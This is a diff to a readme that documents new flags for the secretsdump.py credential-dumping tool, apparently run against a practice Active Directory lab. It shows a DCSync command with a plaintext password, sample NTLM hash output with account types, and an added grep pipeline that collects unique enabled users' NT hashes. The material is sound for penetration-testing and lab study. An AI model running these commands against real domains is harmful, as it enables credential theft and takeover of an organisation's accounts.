@@ -2,11 +2,11 @@ Update secretsdump.py
 ========
 
 New flags (for LOCAL, VSS and DRSUAPI methods get credentials from ntds.dit):
-- -sid - Replace RID to SID
-- -account-type - Display account type (User, Machine, Trust)
+- `-sid` - Replace RID to SID
+- `-account-type` - Display account type (User, Machine, Trust)
 
 ```
-secretsdump.py essos.local/'daenerys.targaryen':'BurnThemAll!'@meereen.essos.local -history -user-status -pwd-last-set -just-dc-ntlm -sid -account-type -outputfile essos_dcsync.local
+secretsdump.py essos.local/'daenerys.targaryen':'BurnThemAll!'@meereen.essos.local -history -user-status -pwd-last-set -just-dc-ntlm -sid -account-type -outputfile essos.local
 ```
 ```
 Output >
@@ -45,4 +45,9 @@ SEVENKINGDOMS$_history0:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b
 SEVENKINGDOMS$_history1:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:ee91a5854bd0e83685e7c84ca0fc497c:::(status=Enabled)(accountType=Trust)
 SEVENKINGDOMS$_history2:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:ee91a5854bd0e83685e7c84ca0fc497c:::(status=Enabled)(accountType=Trust)
 SEVENKINGDOMS$_history3:S-1-5-21-1614210445-3434418105-4037753173-1105:aad3b435b51404eeaad3b435b51404ee:1de8088e4e3ee094d12d3a6c32c024f9:::(status=Enabled)(accountType=Trust)
+```
+
+Unique user's NT-hashes include history
+```
+grep 'accountType=User' essos.local.ntds | grep 'status=Enabled' | cut -d ":" -f 4 | sort -us | tee ueh-uniq-nt.txt
 ```
